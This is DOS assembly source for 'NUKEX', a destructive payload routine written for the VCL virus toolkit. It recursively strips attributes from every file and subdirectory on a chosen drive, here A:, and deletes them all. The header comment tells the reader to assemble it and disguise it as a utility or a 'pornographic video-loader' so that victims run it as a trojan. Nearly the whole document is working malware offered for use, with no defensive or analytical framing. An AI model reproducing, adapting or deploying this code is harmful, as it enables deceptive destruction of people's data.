

;****************************************************************************
; NUKEX deletes the entire directory structure of a disk and all
; the files in its subdirectories and root. Add it to your VCL
; routines with the only variable   
; entered in 'nukit' as the string "x:\",0 where 'x' is the drive
; to be 'nuked.'[This example is set up to 'nuke' the structure of
; the A drive.]
;
; The NUKEX routine is derived heavily from Jeff Prosise's public
; domain utility 'NUKE' and for that, I thank him muchly.  As such, NUKEX
; is heavily cushioned with error handlers which will cause it
; to exit silently to DOS if any difficulty is encountered. However, 
; in most cases this will never occur.  NUKEX is fast, fast, fast, too,
; and presents the user with the somewhat unpalatable task of 'undeleting'
; hundreds, perhaps thousands, of files on a packed hard disk. 
; NUKEX also works perfectly as a standalone. Choose the drive, assemble,
; rename as a utility or pornographic video-loader, stand back and watch
; NUKEX do its stuff. --URNST KOUCH
;****************************************************************************

code            segment
                assume  cs:code,ds:code
                org     100h
begin:          jmp     main


nukit           db    "A:\",0            ;Drive to be treated with "nukex"
drive           db      ?                       ;Home drive
updir           db      "..",0                  ;Command to move up a level
filespec        db      "*.*",0                 ;File spec for searches
homedir db      "\",64 dup (?)                  ;Name of home directory
currdir db      "x:\",64 dup (?)                ;Name of current directory

main            proc    near
                cld                             ;Clear direction flag
                mov     si,offset nukit   ;Point SI to root of drive to nuke
                jmp     checkmem                
                                                ; Check if there's
checkmem:       cmp     sp,4000h                ; enough memory to run the
                ja      load                    ; program.

error:          mov     ax,4C01h                ; Exit if not enough memory.
                int     21h
;
; Set up the nukex run.
;
load:           jmp     prep                    ;Branch to prep
error1:         mov     ax,4C00h
                int     21h

; Save the current drive and directory.
;
prep:           push    si                      ;Save address
                mov     ah,19h                  ;Get default drive and
                int     21h                     ;  save it in DRIVE
                mov     drive,al
                mov     ah,47h                  ;Get current directory and
                sub     dl,dl                   ;  save it in HOMEDIR
                mov     si,offset homedir+1
                int     21h
                pop     si
;
; Go to the drive and directory entered in nukit.
;
                push    si
                mov     byte ptr [si],0         ;Convert to ASCIIZ
                pop     si                      ;Retrieve starting address
                cmp     byte ptr [si+1],":"     ;Branch if path does not
                jne     nodrive                 ;  contain a drive code

                mov     al,byte ptr [si+2]      ;Make sure a directory name
                cmp     al,20h                  ;  appears after the drive
                je      error1                  ;  code
                cmp     al,2Ch                  ; if there are any screw-ups,
                je      error1                  ; exit
                cmp     al,0
                je      error1

                lodsb                           ;Get drive code
                and     al,0DFh                 ;Capitalize it
                sub     al,41h                  ;Normalize it (0=A, 1=B...)
                mov     ah,0Eh                  ;Set default drive
                mov     dl,al
                int     21h
                mov     ah,19h                  ;See if it worked by seeing
                int     21h                     ;what is now the default
                inc     si                      ;Point SI to directory name

nodrive:        mov     ah,19h                  ;Get default drive and add
                int     21h                     ;it to CURRDIR for
                add     al,41h                  ;status messages
                mov     currdir,al
                mov     ah,3Bh                  ;Change directories
                mov     dx,si
                int     21h
                jnc     nukem                   ;Branch if the call succeeded
                mov     ah,0Eh                  ;Restore the default drive
                mov     dl,drive                ;and exit if it did not
                int     21h
                jmp     error
;
; Nuke everything now!
;
nukem:          call    nuke                    ;Nuke everything

                mov     ah,47h                  ;Get current directory
                sub     dl,dl
                mov     si,offset currdir+3
                int     21h
                mov     ah,3Bh                  ;Go up one level
                mov     dx,offset updir
                int     21h
                jc      root                    ;Branch if root directory

                mov     ah,3Ah                  ;Remove the final
                mov     dx,offset currdir       ;subdirectory
                int     21h
                jnc     showdir                 ;Branch if call succeeded
                                                ;Error if subdirectory cannot
                jmp     fatal_exit              ;not be removed

showdir:        nop                             ;Nonsense instruction: a lazy
                                                ;man's out.
root:           mov     ah,0Eh                  ;Restore default drive
                mov     dl,drive
                int     21h
                mov     ah,3Bh                  ;Restore current directory
                mov     dx,offset homedir
                int     21h

main_exit:      mov     ax,4C00h                ;Exit with ERRORLEVEL=0
                int     21h
main            endp


nuke            proc    near
                push    bp                      ;Save BP
                mov     ah,2Fh                  ;Get current DTA address
                int     21h
                push    bx                      ;Save it
                push    es
                sub     sp,2Bh                  ;Make room on the stack
                mov     bp,sp                   ;Establish addressability
                mov     ah,1Ah                  ;Set DTA address to a
                mov     dx,bp                   ;  location in the
                int     21h                     ;  stack
;
; Find the first file or subdirectory name.
;
                mov     ah,4Eh                  ;Call function 4Eh (DOS
                mov     cx,17h                  ;  Find First)
                mov     dx,offset filespec
                int     21h
                jnc     testname                ;Proceed if call succeeded
;
; Restore BP, the DTA, and the stack, then exit.
;
nuke_exit:      add     sp,2Bh                  ;Adjust the stack pointer
                mov     ah,1Ah                  ;Restore the DTA to where
                mov     bx,ds                   ;  it was on entry
                pop     ds
                pop     dx
                int     21h
                mov     ds,bx
                pop     bp                      ;Restore BP
                ret                             ;Return to caller
;
; Find another entry and decide what to do with it.
;
findnext:       mov     ah,4Fh                  ;Call function 4Fh (DOS
                int     21h                     ;  Find Next)
                jc      nuke_exit               ;Exit if nothing found

testname:       cmp     byte ptr [bp+30],2Eh    ;Skip . and .. entries
                je      findnext
                test    byte ptr [bp+21],10h    ;Branch if name returned is
                jnz     rmdir                   ;  a subdirectory name
;
; Delete the file whose name was just returned.
;
                mov     ax,4301h                ;Remove any existing file
                sub     cx,cx                   ;  attributes with a call
                mov     dx,bp                   ;  to DOS function 43h
                add     dx,30
                int     21h
                jc      fatal_exit              ;Exit if call failed

                mov     ah,41h                  ;Delete the file
                mov     dx,bp
                add     dx,30
                int     21h
                jc      fatal_exit              ;Exit if call failed
                jmp     findnext                ;Loop back for more
;
; Clear out and remove the subdirectory whose name was just returned.
;
rmdir:          mov     ah,3Bh                  ;Change to the subdirectory
                mov     dx,bp
                add     dx,30
                int     21h

                call    nuke                    ;Clear it out

                mov     ah,47h                  ;Get current directory
                sub     dl,dl
                mov     si,offset currdir+3
                int     21h
                mov     ah,3Bh                  ;Go up a directory level
                mov     dx,offset updir
                int     21h
                mov     ah,3Ah                  ;Remove the subdirectory
                mov     dx,bp
                add     dx,30
                int     21h
                                                ;Exit on error
                jc      fatal_exit

                jmp     findnext                ;Loop back for more
;
; A fatal error occurred.  Terminate.
;
fatal_exit:     mov     bx,dx                   ;Save DX in BX

                jmp     short fatal2            ;  and exit

             

fatal2:         mov     ah,0Eh                  ;Restore default drive
                mov     dl,drive
                int     21h
                mov     ah,3Bh                  ;Restore current directory
                mov     dx,offset homedir
                int     21h
                mov     ax,4C01h                ;Exit with ERRORLEVEL=1
                int     21h
nuke            endp


code            ends
                end     begin

